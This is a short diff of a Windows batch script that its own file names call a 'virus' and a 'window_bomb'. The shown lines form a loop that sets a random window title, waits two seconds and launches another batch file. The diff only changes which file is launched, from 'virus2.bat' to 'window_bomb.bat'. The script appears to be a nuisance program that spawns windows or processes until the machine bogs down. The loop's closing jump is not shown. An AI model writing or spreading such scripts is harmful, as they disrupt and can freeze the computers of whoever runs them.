@@ -5,4 +5,4 @@ Pushd "%~dp0"
 :a
 title Win%Random%a
 timeout /t 2 /nobreak >nul
-start virus2.bat
+start window_bomb.bat
